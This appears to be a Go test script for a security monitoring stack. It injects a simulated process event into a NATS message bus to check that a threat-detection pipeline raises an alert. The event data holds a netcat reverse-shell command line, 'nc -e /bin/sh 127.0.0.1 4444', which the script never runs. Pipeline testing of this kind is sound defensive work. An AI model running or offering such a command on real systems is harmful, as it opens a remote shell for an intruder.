// Inject test event (nc -e) to NATS for pipeline verification.
// Run: go run scripts/inject_test_event.go
// Requires: NATS running, stack (ingest, normalize, detection, api) running.
package main

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/nats-io/nats.go"
)

func main() {
	natsURL := "nats://127.0.0.1:4222"
	if u := os.Getenv("NATS_URL"); u != "" {
		natsURL = u
	}
	nc, err := nats.Connect(natsURL)
	if err != nil {
		fmt.Fprintf(os.Stderr, "NATS connect: %v\n", err)
		fmt.Fprintf(os.Stderr, "Ensure NATS is running (docker compose up) and port 4222 is exposed.\n")
		os.Exit(1)
	}
	defer nc.Close()

	// Simulate agent event: nc -e /bin/sh 127.0.0.1 4444
	env := map[string]interface{}{
		"agent_name":     "test-agent",
		"agent_hostname": "test-host",
		"agent_group":    "",
		"tenant_id":      "default",
		"timestamp":      "2026-02-22T12:00:00Z",
		"event": map[string]interface{}{
			"event_type":  "execve",
			"timestamp":   "2026-02-22T12:00:00Z",
			"pid":         12345,
			"ppid":        1000,
			"uid":         1000,
			"gid":         1000,
			"comm":        "nc",
			"path":        "/usr/bin/nc",
			"exe":         "/usr/bin/nc",
			"cmdline":     "nc -e /bin/sh 127.0.0.1 4444",
			"parent_path": "/usr/bin/bash",
			"parent_cmdline": "bash",
		},
	}
	b, _ := json.Marshal(env)
	if err := nc.Publish("events.default", b); err != nil {
		fmt.Fprintf(os.Stderr, "Publish: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("OK: Injected test event (nc -e /bin/sh) to events.default")
	fmt.Println("Check Threat Alerts in UI within a few seconds.")
}
